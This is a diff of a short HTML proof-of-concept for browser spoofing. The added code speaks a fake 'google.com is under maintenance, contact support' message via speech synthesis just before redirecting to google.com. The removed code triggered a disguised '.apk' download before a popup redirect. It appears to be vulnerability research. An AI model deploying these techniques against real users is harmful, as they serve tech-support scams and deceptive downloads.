@@ -1,38 +1,68 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Download Test</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SpeechSynthesis Redirect PoC (Controlled)</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    text-align: center;
+    padding: 60px;
+  }
+  button {
+    padding: 15px 30px;
+    font-size: 20px;
+    cursor: pointer;
+  }
+  #status {
+    margin-top: 20px;
+    font-size: 18px;
+    color: darkred;
+  }
+</style>
 </head>
 <body>
 
-<h3>Download Test</h3>
-<button onclick="startTest()">Start</button>
+<h2>CLICK TO GOOGLE</h2>
+<button id="speechBtn">CLICK CALL CENTER GOOGLE</button>
+<div id="status">Status: Waiting...</div>
 
 <script>
-function startTest() {
-  // buka popup (user gesture)
-  let w = window.open("about:blank", "_blank");
+const btn = document.getElementById('speechBtn');
+const status = document.getElementById('status');
 
-  // trigger 1 download saja (data URL)
-  const a = document.createElement('a');
-  a.href = 'google:text/plain;charset=utf-8,hello_world';
-  a.download = 'test.apk';
-  document.body.appendChild(a);
-  a.click();
-  document.body.removeChild(a);
+btn.addEventListener('click', () => {
 
-  console.log("Download triggered from:", location.origin);
+  const text = "Attention: google.com is currently under maintenance. Please contact support immediately.";
 
-  // setelah itu baru redirect popup
+  if (!('speechSynthesis' in window)) {
+    status.textContent = "SpeechSynthesis not supported.";
+    return;
+  }
+
+  const utter = new SpeechSynthesisUtterance(text);
+  utter.lang = 'en-US';
+
+  const voices = speechSynthesis.getVoices();
+  const enVoice = voices.find(v => v.lang.startsWith('en'));
+  if (enVoice) utter.voice = enVoice;
+
+  status.textContent = "Preparing redirect...";
+
+  // Redirect cepat
   setTimeout(() => {
-    try {
-      w.location.href = "https://google.com";
-      console.log("Popup navigated");
-    } catch(e){
-      console.log(e);
-    }
-  }, 1000);
-}
+
+    // Trigger speech tepat sebelum navigasi
+    speechSynthesis.speak(utter);
+    console.log("[PoC] Speech triggered");
+
+    // Navigasi langsung setelah speech dipanggil
+    window.location.replace('https://google.com');
+
+  }, 100); // delay kecil (bisa tweak 100–500ms untuk testing)
+
+});
 </script>
 
 </body>
